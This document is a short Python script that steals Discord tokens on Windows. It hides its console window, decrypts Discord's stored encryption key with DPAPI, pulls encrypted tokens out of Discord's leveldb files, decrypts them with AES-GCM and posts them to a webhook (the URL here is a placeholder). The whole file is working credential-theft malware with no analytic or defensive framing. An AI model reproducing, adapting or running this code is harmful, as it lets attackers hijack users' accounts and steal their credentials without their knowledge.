import os
import json
import base64
import re
import win32crypt
from Crypto.Cipher import AES
import requests
import ctypes
import sys
WEBHOOK_URL="qzd"
if sys.platform=="win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
def get_encryption_key():
    try:
        p=os.path.expandvars(r"%APPDATA%\discord\Local State")
        with open(p,"r",encoding="utf-8")as f:j=json.load(f)
        k=win32crypt.CryptUnprotectData(base64.b64decode(j["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
        return k
    except:
        return None
def decrypt_payload(c,k):
    try:
        n=c[3:15]
        ci=AES.new(k,AES.MODE_GCM,nonce=n)
        return ci.decrypt_and_verify(c[15:-16],c[-16:]).decode()
    except:
        return""
def find_tokens(p,k):
    t=[]
    r=re.compile(b"dQw4w9WgXcQ:[^\"]*")
    for f in os.listdir(p):
        if not(f.endswith(".log")or f.endswith(".ldb")):continue
        try:
            with open(os.path.join(p,f),"rb")as bf:d=bf.read()
            for m in r.findall(d):
                try:
                    dt=decrypt_payload(base64.b64decode(m[len(b"dQw4w9WgXcQ:"):]),k)
                    if dt and len(dt.split('.'))==3:t.append(dt)
                except:continue
        except:continue
    return t
def send_to_webhook(t):
    if not t:return
    try:
        requests.post(WEBHOOK_URL,json={"content":"**Tokens Discord :**\n"+"\n".join(t)})
    except:pass
if __name__=="__main__":
    p=os.path.expandvars(r"%APPDATA%\discord\Local Storage\leveldb")
    if not os.path.exists(p):sys.exit()
    k=get_encryption_key()
    if not k:sys.exit()
    send_to_webhook(list(set(find_tokens(p,k))))